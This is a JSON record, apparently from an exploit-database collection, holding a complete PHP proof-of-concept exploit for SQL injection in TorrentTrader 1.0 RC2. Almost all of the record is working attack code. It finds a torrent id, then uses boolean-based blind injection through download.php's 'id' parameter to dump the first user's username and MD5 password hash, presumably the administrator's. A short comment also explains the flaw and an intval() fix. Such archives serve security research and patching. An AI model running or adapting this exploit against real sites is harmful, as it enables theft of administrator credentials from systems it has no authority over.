{
  "id": "430",
  "title": "TorrentTrader 1.0 RC2 - SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php \r\n\r\n\r\n<? \r\n\r\n\r\n/* \r\n\r\n\r\nTorrentTrader 1.0 RC2 SQL Injection Proof of Concept \r\nBy aCiDBiTS acidbits_at_hotmail.com 31-August-2004 \r\n\r\n\r\n\"TorrentTrader (http://www.torrenttrader.com/) is a feature packed and \r\nhighly customisable open-source BitTorrent tracker.\" \r\n\r\n\r\nThis PoC dumps the username and password's md5 hash of first user in \r\nTorrentTrader web application database, that should be the administrator. \r\nFirst it fetchs a valid torrent id, then it determines if database's user \r\ncan perform \"union select\" and finally obtains the username and \r\nmd5(password). Tested on TorrentTrader 1.0 RC2, maybe older versions also \r\nvulnerable. \r\n\r\n\r\nUsage (in my debian box): \r\nphp4 -q ./tt_sqli_poc.php \"http://127.0.0.1/torrenttrade\" \r\n\r\n\r\n\r\n++ Vulnerability description & workaround++ \r\n\r\n\r\nThere is no user input sanization for parameter \"id\" in download.php prior \r\nbeeing used in a SQL query. This can be exploited to manipulate SQL queries \r\nby injecting arbitrary SQL code. A workaround to solve this is to modify \r\ndownload.php, line13: \r\n\r\n\r\n$res = mysql_query(\"SELECT filename FROM torrents WHERE id = $id\"); \r\n\r\n\r\nWith: \r\n\r\n\r\n$res = mysql_query(\"SELECT filename FROM torrents WHERE id = \r\n\".intval($id)); \r\n\r\n\r\n\r\n*/ \r\n\r\n\r\n\r\necho \"+----------------------------------------------------------+\\n| \r\nTorrentTrader 1.0 RC2 SQL Injection Proof of Concept |\\n| By aCiDBiTS \r\nacidbits_at_hotmail.com 31-August-2004 \r\n|\\n+----------------------------------------------------------+\\n\\n\"; \r\n\r\n\r\n\r\nif($argc<2) die(\"Usage: \".$argv[0].\" URL_to_TorrentTrader_script\\n\\n\"); \r\n$host=$argv[1]; \r\nif(substr($host,strlen($host)-1,1)!='/') $host.='/'; \r\n\r\n\r\necho \"[+] Getting valid torrent id ... \"; \r\n$webc=get_web($host); \r\n$temp=explode(\"torrents-details.php?id=\",$webc); \r\n$id=intval($temp[1]); \r\nif( !$id ) die( \"Failed!\\n\\n\"); \r\necho \"OK\\n Using Torrent id: $id\\n\\n\"; \r\n\r\n\r\necho \"[+] Checking if injection is possible ... \"; \r\n$bas=$id.\"%20and%200%20union%20select%201%20from%20users%20where%20\"; \r\nif( test_cond( $bas.\"1\" ) && !test_cond( $bas.\"0\" ) ) echo \" OK\\n\\n\"; else \r\ndie (\"\\n\\n Failed! \\n\\n\"); \r\n\r\n\r\necho \"[+] Getting username & password ... \\n Username: \"; \r\nget_field( \"username\"); \r\necho \"\\n MD5(Password): \"; \r\nget_field( \"password\" ); \r\n\r\n\r\ndie(\"\\n\\n \\ / \\ /\\n (Oo) Done! (oO)\\n //||\\\\\\\\ \r\n//||\\\\\\\\\\n\\n\"); \r\n\r\n\r\n\r\nfunction test_cond( $cond ) \r\n{ \r\nglobal $host; \r\n$res=get_web( $host.\"download.php?id=\".$cond); \r\nif( eregi( \"The ID has been found on the Database, but the torrent has \r\ngone!\", $res ) ) \r\nreturn 1; \r\nelse return 0; \r\n} \r\n\r\n\r\n\r\nfunction get_field( $field ) \r\n{ \r\nglobal $bas; \r\n$unval= \" 0123456789ABCDEFGHIJKLMNOPRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"; \r\n$idx=1; \r\n$min=0; \r\n$max=strlen($unval); \r\nwhile($min!=$max) { \r\n$mid=$min+(($max-$min)/2); \r\nif( \r\ntest_cond($bas.\"id=1%20and%20ord(substring($field,$idx,1))=\".ord(substr($unval,$mid,1))) \r\n) { \r\n$idx++; \r\necho substr($unval,$mid,1); \r\n$min=0; \r\n$max=strlen($unval); \r\nif( !test_cond($bas.\"id=1%20and%20ord(substring($field,$idx,1))\") ) \r\nreturn; \r\n} else { \r\nif( \r\ntest_cond($bas.\"id=1%20and%20ord(substring($field,$idx,1))<\".ord(substr($unval,$mid,1))) \r\n) $max=$mid; \r\nelse $min=$mid; \r\n} \r\n} \r\ndie( \"\\n\\nUnexpected error!\\n\\n\"); \r\n} \r\n\r\n\r\n\r\nfunction get_web($url) \r\n{ \r\n$ch=curl_init(); \r\ncurl_setopt ($ch, CURLOPT_URL, $url); \r\ncurl_setopt ($ch, CURLOPT_HEADER, 0); \r\ncurl_setopt ($ch, CURLOPT_RETURNTRANSFER,1); \r\n$data=curl_exec ($ch); \r\ncurl_close ($ch); \r\nreturn $data; \r\n} \r\n\r\n\r\n\r\n/* \\ / \r\n(Oo) \r\n//||\\\\ */ \r\n\r\n\r\n?>\r\n\r\n# milw0rm.com [2004-09-01]",
  "url": "https://www.exploit-db.com/exploits/430"
}